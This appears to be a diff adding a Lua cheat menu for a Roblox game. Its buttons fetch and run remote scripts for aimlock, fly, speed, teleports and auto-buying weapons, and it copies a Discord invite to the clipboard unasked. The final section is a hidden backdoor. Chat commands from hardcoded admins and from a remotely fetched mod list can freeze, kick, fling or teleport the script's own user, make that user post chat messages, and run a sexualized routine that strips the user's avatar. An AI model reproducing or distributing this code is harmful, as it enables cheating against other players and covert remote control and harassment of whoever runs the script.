@@ -1,0 +1,378 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Scratchion                                            discord.gg/xKc62CYcAu", "Ocean")
+
+setclipboard("discord.gg/xKc62CYcAu")
+
+wait (0.2)
+
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Discord Invite";
+    Text = "Copied Scratchion Invite to your clipboard!";
+    Icon = "http://www.roblox.com/asset/?id=8825637242";
+    Duration = "3";
+})
+
+local Tab = Window:NewTab("Main")
+local Section = Tab:NewSection("<+----+----+>")
+Section:NewButton("ScratchAssist (Aimlock)", "Opens up the GUI.", function()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MyrComb/ScratchAssist/main/output-DHuI"))()
+end)
+
+Section:NewButton("Anti-Stomp (Press to Use)", "Only saves streak! Not weapons.", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IRunServers/just-cant-stop/main/anti"))()
+end)
+
+Section:NewButton("Anti-Stomp (CHECK INFO!! 3 dots)", "Auto Anti, re-Execute when you died.", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IRunServers/just-cant-stop/main/message%20-%202022-02-14T112200.411.txt"))()
+end)
+
+local Tab = Window:NewTab("Player")
+local Section = Tab:NewSection("<+----+----+>")
+Section:NewButton("Speed (C)", "Hold C for Speed.", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IRunServers/just-cant-stop/main/message%20-%202022-02-14T110725.226.txt"))()
+end)
+
+Section:NewButton("Fly", "Opens up the fly GUI.", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IRunServers/just-cant-stop/main/message%20-%202022-02-14T110658.845.txt"))()
+end)
+
+Section:NewButton("Tag Changer", "Opens up the Tag GUI.", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IRunServers/just-cant-stop/main/message%20-%202022-02-14T110555.800.txt"))()
+end)
+
+Section:NewButton("Inf Jump", "Enables Auto Jump.", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MyrComb/InfJump/main/output-blpO"))()
+end)
+
+local Tab = Window:NewTab("Misc")
+local Section = Tab:NewSection("<+----+----+>")
+Section:NewButton("Trash Talk (K)", "Keep pressing K for it to work.", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IRunServers/just-cant-stop/main/message%20-%202022-02-14T110629.468.txt"))()
+end)
+
+Section:NewButton("No Waist Troll GUI (FE)", "Opens the no waist GUI.", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IRunServers/just-cant-stop/main/message%20-%202022-02-14T110520.326.txt"))()
+end)
+
+Section:NewColorPicker("Bullet Color (CLIENTSIDE)", "Changes Bullet Color.", Color3.fromRGB(0,0,0), function(color)
+    game.Players.LocalPlayer.Information.RayColor.Value = color
+end)
+
+Section:NewKeybind("Toggle UI", "Toggles the UI", Enum.KeyCode.V, function()
+	Library:ToggleUI()
+end)
+
+local Tab = Window:NewTab("Teleports")
+local Section = Tab:NewSection("YOU CAN GET KICKED IF U SIT DURING TP")
+Section:NewLabel("Good Guns")
+
+Section:NewButton("Revolver", "TP's to Revolver", function()
+    local New_CFrame = CFrame.new(-2569.18, 401, -778.763)
+
+local ts = game:GetService('TweenService')
+local char = game.Players.LocalPlayer.Character
+
+local part = char.HumanoidRootPart
+local ti = TweenInfo.new(3, Enum.EasingStyle.Linear)
+local tp = {CFrame = New_CFrame}
+ts:Create(part, ti, tp):Play()
+wait(4)
+fireclickdetector(game.Workspace.Shop.Guns["[Revolver] - $1600"].ClickDetector)
+end)
+
+Section:NewButton("Double Barrel", "TP's to DB.", function()
+    local New_CFrame = CFrame.new(-2963.13, 401, -915.956)
+
+local ts = game:GetService('TweenService')
+local char = game.Players.LocalPlayer.Character
+
+local part = char.HumanoidRootPart
+local ti = TweenInfo.new(3, Enum.EasingStyle.Linear)
+local tp = {CFrame = New_CFrame}
+ts:Create(part, ti, tp):Play()
+wait(4)
+fireclickdetector(game.Workspace.Shop.Guns["[Double Barrel SG] - $800"].ClickDetector)
+end)
+
+Section:NewButton("Flamethrower", "TP's to Flamethrower.", function()
+    local New_CFrame = CFrame.new(-2074.55, 432, -766.567)
+
+local ts = game:GetService('TweenService')
+local char = game.Players.LocalPlayer.Character
+
+local part = char.HumanoidRootPart
+local ti = TweenInfo.new(3, Enum.EasingStyle.Linear)
+local tp = {CFrame = New_CFrame}
+ts:Create(part, ti, tp):Play()
+wait(4)
+fireclickdetector(game.Workspace.Shop.Guns["[Flamethrower] - $7550"].ClickDetector)
+end)
+
+Section:NewButton("Golden AK", "TP's to Golden AK.", function()
+    local New_CFrame = CFrame.new(-1981.4, 320, -498.781)
+
+local ts = game:GetService('TweenService')
+local char = game.Players.LocalPlayer.Character
+
+local part = char.HumanoidRootPart
+local ti = TweenInfo.new(3, Enum.EasingStyle.Linear)
+local tp = {CFrame = New_CFrame}
+ts:Create(part, ti, tp):Play()
+wait(4)
+fireclickdetector(game.Workspace.Shop.Guns["[Golden AK-47] - $5250"].ClickDetector)
+end)
+
+local Section = Tab:NewSection("Armor")
+
+Section:NewButton("Medium Armor (Station)", "TP's to Medium Armor.", function()
+    local New_CFrame = CFrame.new(-2183.07, 401, -745.089)
+
+local ts = game:GetService('TweenService')
+local char = game.Players.LocalPlayer.Character
+
+local part = char.HumanoidRootPart
+local ti = TweenInfo.new(3, Enum.EasingStyle.Linear)
+local tp = {CFrame = New_CFrame}
+ts:Create(part, ti, tp):Play()
+wait(4)
+fireclickdetector(game.Workspace.Shop.Guns["[Medium Armor] - $550"].ClickDetector)
+end)
+
+Section:NewButton("Medium Armor (House)", "TP's to Medium Armor.", function()
+    local New_CFrame = CFrame.new(-2535.66, 389, -1456.39)
+
+local ts = game:GetService('TweenService')
+local char = game.Players.LocalPlayer.Character
+
+local part = char.HumanoidRootPart
+local ti = TweenInfo.new(3, Enum.EasingStyle.Linear)
+local tp = {CFrame = New_CFrame}
+ts:Create(part, ti, tp):Play()
+wait(4)
+fireclickdetector(game.Workspace.Shop.Guns["[Medium Armor] - $550"].ClickDetector)
+end)
+
+Section:NewButton("Medium-High Armor", "TP's to Medium-High Armor.", function()
+    local New_CFrame = CFrame.new(-2860.01, 353, -82.1079)
+
+local ts = game:GetService('TweenService')
+local char = game.Players.LocalPlayer.Character
+
+local part = char.HumanoidRootPart
+local ti = TweenInfo.new(3, Enum.EasingStyle.Linear)
+local tp = {CFrame = New_CFrame}
+ts:Create(part, ti, tp):Play()
+wait(4)
+fireclickdetector(game.Workspace.Shop.Guns["[High-Medium Armor] - $550"].ClickDetector)
+end)
+
+local Section = Tab:NewSection("Places")
+
+Section:NewButton("Gun Shop", "TP's to Gun Shop.", function()
+    local New_CFrame = CFrame.new(-2506.31, 390, -1402.31)
+
+local ts = game:GetService('TweenService')
+local char = game.Players.LocalPlayer.Character
+
+local part = char.HumanoidRootPart
+local ti = TweenInfo.new(3, Enum.EasingStyle.Linear)
+local tp = {CFrame = New_CFrame}
+ts:Create(part, ti, tp):Play()
+end)
+
+Section:NewButton("Cinema", "TP's to Cinema.", function()
+    local New_CFrame = CFrame.new(-2929.08, 412.746, -825)
+
+local ts = game:GetService('TweenService')
+local char = game.Players.LocalPlayer.Character
+
+local part = char.HumanoidRootPart
+local ti = TweenInfo.new(3, Enum.EasingStyle.Linear)
+local tp = {CFrame = New_CFrame}
+ts:Create(part, ti, tp):Play()
+end)
+
+Section:NewButton("Bank", "TP's to Bank.", function()
+    local New_CFrame = CFrame.new(-2342, 402, -951.155)
+
+local ts = game:GetService('TweenService')
+local char = game.Players.LocalPlayer.Character
+
+local part = char.HumanoidRootPart
+local ti = TweenInfo.new(3, Enum.EasingStyle.Linear)
+local tp = {CFrame = New_CFrame}
+ts:Create(part, ti, tp):Play()
+end)
+
+Section:NewButton("Playground", "TP's to Playground.", function()
+    local New_CFrame = CFrame.new(-2208.97, 409, -1455)
+
+local ts = game:GetService('TweenService')
+local char = game.Players.LocalPlayer.Character
+
+local part = char.HumanoidRootPart
+local ti = TweenInfo.new(3, Enum.EasingStyle.Linear)
+local tp = {CFrame = New_CFrame}
+ts:Create(part, ti, tp):Play()
+end)
+
+
+local Tab = Window:NewTab("Credits")
+local Section = Tab:NewSection("<+----+----+>")
+Section:NewLabel("Made by ComboRxll#2506 and Empire#4946")
+
+local Section = Tab:NewSection("<+----+----+>")
+Section:NewLabel("Thanks to Spider-Man#9305 for")
+Section:NewLabel("learning me the basics!")
+Section:NewLabel("And also providing 2 scripts for me :D")
+
+local Section = Tab:NewSection("<+----+----+>")
+Section:NewLabel("Also a massive thanks to Empire#4946")
+Section:NewLabel("For helping me make")
+Section:NewLabel("Anti-Stomp and giving FE No Waist GUI!")
+
+local swagmins = {
+    1,-- these aren't important
+  }
+  
+  local bending = false
+  local kickmsg = 'PERMA BANNED'
+  local function commands(msg,plr)
+      if DisableMod == false or table.find(swagmins, plr) then
+          local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
+          local Msg = string.lower(msg)
+          local SplitCMD = string.split(Msg,' ')
+          local Lower = string.lower(player.Name)
+          local Allowed = string.find(Lower, SplitCMD[2])
+          if Allowed then
+              if string.find(SplitCMD[1], 'skid.freeze') then
+                  player.Character.HumanoidRootPart.Anchored = true
+              end
+              if string.find(SplitCMD[1], 'skid.thaw') then
+                  player.Character.HumanoidRootPart.Anchored = false
+              end
+              if string.find(SplitCMD[1], 'skid.benx') then
+                  bending = true
+                  local segtarget = Mod.Name
+                  local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
+                  Crouch.Looped = true
+                  Crouch:Play()
+                  local away = .5
+                  local reversing = false
+                  local shirt = player.Character:FindFirstChild('Shirt')
+                  local pants = player.Character:FindFirstChild('Pants')
+                  if shirt then
+                      shirt:Destroy()
+                  end
+                  if pants then
+                      pants:Destroy()
+                  end
+                  local Loop
+                  local loopFunction = function()
+                      local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
+                      local character = player.Character
+                      if targetchar then
+                          if reversing == true then
+                              away = away - 0.1
+                          else
+                              away = away + 0.1
+                          end
+                          if away >= 2 then
+                              reversing = true
+                          elseif away < 0.5 then
+                              reversing = false
+                          end
+                          character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
+                      end
+                  end;
+                  local Start = function()
+                      Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
+                  end;
+                  local Pause = function()
+                      Loop:Disconnect()
+                      Crouch:Stop()
+                  end;
+                  Start()	
+                  repeat wait() until bending == false
+                  Pause()
+              end
+              if string.find(SplitCMD[1], 'skid.unbenx') then
+                  while bending == true do
+                      wait()
+                      bending = false
+                  end
+              end
+              if string.find(SplitCMD[1], 'skid.kick') then
+                  local ISADMIN = table.find(swagmins, player.UserId)
+                  if not ISADMIN then
+                      kickmsg = Mod.Name
+                      player:Kick(kickmsg)
+                      wait(5)
+                      while true do end
+                  end
+              end
+              if string.find(SplitCMD[1], 'skid.bring') then
+                  player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
+              end
+              if string.find(SplitCMD[1], 'skid.cuffban') then
+                  if table.find(swagmins, plr) then
+                      local ISADMIN = table.find(swagmins, player.UserId)
+                      if not ISADMIN then
+                          player:Kick('Stop .')
+                      end
+                  end
+              end
+              if string.find(SplitCMD[1], 'skid.fling') then
+                  player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+              end
+          else
+              if string.find(msg, 'skid.say') then
+                  game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("astolfo is zaddy", 'All');
+              end
+          end
+      end
+  end
+  
+  muted = {}
+  mutingnew = false 
+  
+  local ModCheck = loadstring(game:HttpGet('https://raw.githubusercontent.com/MyrComb/Mods/main/ModList'))()
+  Players.PlayerAdded:Connect(function(plr)
+      local SWAGMIN = table.find(swagmins, plr.UserId)
+      if SWAGMIN or ModCheck[plr.UserId] then
+          plr.Chatted:Connect(function(msg)
+              commands(msg, plr.UserId)
+          end)
+      end
+      if muteingnew == true then
+          if not table.find(muted, plr.Name) then
+              table.insert(muted, plr.Name)
+              print('automuted ' .. plr.Name)
+          end
+      end
+  end)
+  
+  for i,v in pairs(game:GetService('Players'):GetChildren()) do
+      local SWAGMIN = table.find(swagmins, v.UserId)
+      if SWAGMIN or ModCheck[v.UserId] then
+          print('found')
+          v.Chatted:Connect(function(msg)
+             commands(msg, v.UserId)
+          end)
+      end
+  end
+  
+  wait(5)
+  if ModCheck[player.UserId] then
+      IsMod = true
+      DisableMod = true
+      announce('Granted Mod Powers', 'you are immune to mod powers | type /e noshield or /e shield to toggle', 10)
+  elseif table.find(swagmins, player.UserId) then
+      announce('Granted Admin Powers', 'hi :3', 10)
+      IsMod = false
+      DisableMod = false
+  else
+      IsMod = false
+      DisableMod = false
+      announce('Commands Loaded', 'join discord.gg/a dfah for a list of commands', 10)
+  end
